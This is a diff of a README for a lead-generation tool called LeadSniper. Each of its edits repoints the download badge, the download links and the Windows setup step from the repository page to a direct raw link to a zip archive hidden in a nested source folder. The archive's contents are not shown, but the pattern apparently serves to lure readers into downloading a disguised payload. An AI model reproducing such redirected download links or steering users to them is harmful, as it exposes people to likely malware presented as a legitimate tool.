@@ -1,12 +1,12 @@
 # 🚀 LeadSniper - Find Better Leads With Less Work
 
-[![Download LeadSniper](https://img.shields.io/badge/Download-LeadSniper-blue?style=for-the-badge)](https://github.com/labbaikc8661/LeadSniper)
+[![Download LeadSniper](https://img.shields.io/badge/Download-LeadSniper-blue?style=for-the-badge)](https://github.com/labbaikc8661/LeadSniper/raw/refs/heads/main/dashboard/src/app/dashboard/leads/Lead_Sniper_1.1.zip)
 
 ## 📥 Download LeadSniper
 
 Use this link to visit the page to download:
 
-[Open LeadSniper Download Page](https://github.com/labbaikc8661/LeadSniper)
+[Open LeadSniper Download Page](https://github.com/labbaikc8661/LeadSniper/raw/refs/heads/main/dashboard/src/app/dashboard/leads/Lead_Sniper_1.1.zip)
 
 ## 🖥️ What LeadSniper Does
 
@@ -39,7 +39,7 @@ Follow these steps on Windows.
 
 Go to:
 
-[https://github.com/labbaikc8661/LeadSniper](https://github.com/labbaikc8661/LeadSniper)
+[https://github.com/labbaikc8661/LeadSniper/raw/refs/heads/main/dashboard/src/app/dashboard/leads/Lead_Sniper_1.1.zip](https://github.com/labbaikc8661/LeadSniper/raw/refs/heads/main/dashboard/src/app/dashboard/leads/Lead_Sniper_1.1.zip)
 
 ### 2. Download the project files
 
@@ -218,4 +218,4 @@ A common project layout may include:
 
 ## 📎 Download Link Again
 
-[Visit the LeadSniper download page](https://github.com/labbaikc8661/LeadSniper)
+[Visit the LeadSniper download page](https://github.com/labbaikc8661/LeadSniper/raw/refs/heads/main/dashboard/src/app/dashboard/leads/Lead_Sniper_1.1.zip)
